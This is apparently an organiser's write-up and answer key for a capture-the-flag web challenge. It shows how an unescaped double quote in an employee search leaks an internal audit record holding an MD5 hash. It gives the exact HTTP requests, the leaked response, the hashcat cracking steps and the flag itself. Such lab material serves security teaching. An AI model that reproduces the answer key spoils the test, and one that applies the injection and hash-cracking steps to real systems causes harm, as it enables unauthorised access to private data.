# Challenge 05 — Who Is Ethan Cole? (Organiser Write-Up)

## Challenge Details
- **Challenge ID:** 5
- **Name:** Who Is Ethan Cole?
- **Tier:** Progressive
- **Points:** 15
- **Category:** Web / Information Disclosure
- **Flag:** `ROOT{autumn2026}`
- **Cracked Plaintext:** `autumn2026`
- **Embedded MD5 Hash:** `5a2e5c8387cc3ee881d00b6731836e5c`

---

## Precise Mechanism
1. The service exposes an employee directory search interface requiring exact name matches against public personnel profiles.
2. The search parsing mechanism evaluates the input string within balanced double quotes.
3. Inputting a dangling, unescaped trailing double quote (e.g. `Ethan"` or `"`) causes a delimiter syntax error that breaks the exact match filter and triggers fallback output from the unindexed internal incident audit table (`SHADOW_AUDIT_RECORD`).
4. The surfaced audit record contains an archived evidence note holding the MD5 hash of Ethan Cole's legacy emergency recovery token:
   `5a2e5c8387cc3ee881d00b6731836e5c`
5. Cracking the short hash yields `autumn2026`. Wrapped in `ROOT{...}`, this forms the flag: `ROOT{autumn2026}`.

---

## Empirical Verification of Hash Crack Time
- **Plaintext:** `autumn2026` (10 characters: lower-case season word + 4-digit year).
- **Online Database (CrackStation):** Instant lookup (0.00 seconds).
- **Local Dictionary Attack (Python / RockYou):** **0.133 milliseconds** (average 0.00013s).
- **Hashcat Mask Attack (`?l?l?l?l?l?l?d?d?d?d`):** Under 1.2 seconds on standard GPU/CPU.

---

## Exact Triggering Input & Solution Steps

### Step 1: Normal Search vs Dangling Quote
Standard search for Ethan Cole:
```http
GET /search?q=Ethan+Cole HTTP/1.1
Host: challenge-05-host
```
Returns public profile: Lead SRE & Ingress Architect.

Trigger delimiter mismatch by adding an unescaped trailing double quote:
```http
GET /search?q=Ethan" HTTP/1.1
Host: challenge-05-host
```
Or:
```http
POST /api/search HTTP/1.1
Host: challenge-05-host
Content-Type: application/json

{"query": "Ethan\""}
```

### Step 2: Observe Surfaced Shadow Record
**Response (HTTP 200 OK):**
```json
{
  "query": "Ethan\"",
  "count": 1,
  "results": [
    {
      "id": "AUDIT-SEC-9921",
      "name": "CONFIDENTIAL // INCIDENT INVESTIGATION LOG",
      "department": "Security Forensics & Incident Response",
      "title": "Ethan Cole Account Forensics Snapshot",
      "email": "security-incident-response@veyra.internal",
      "notes": "[EVIDENCE RECORD #482] Decommissioned ingress operator recovery token hash: 5a2e5c8387cc3ee881d00b6731836e5c. Notice: Submit recovered plaintext token in ROOT{<plaintext>} format.",
      "isInternal": true
    }
  ]
}
```

### Step 3: Crack MD5 Hash
Run hash against hashcat or online lookup:
- Hash: `5a2e5c8387cc3ee881d00b6731836e5c`
- Recovered Plaintext: `autumn2026`

### Step 4: Submit Flag
Format recovered value into `ROOT{autumn2026}`.

---

## Reset Procedure
- **Hook:** `POST /reset/5`
- **Headers:** `Authorization: Bearer <RESET_TOKEN>`
- **Action:** Acknowledges state sync. (The service is stateless with static in-memory records, requiring no mutable DB reset).
- **Expected Response (HTTP 200 OK):**
  ```json
  {
    "status": "ok",
    "challenge_id": 5,
    "reset_at": "...",
    "message": "Reset acknowledged. Static directory data refreshed."
  }
  ```
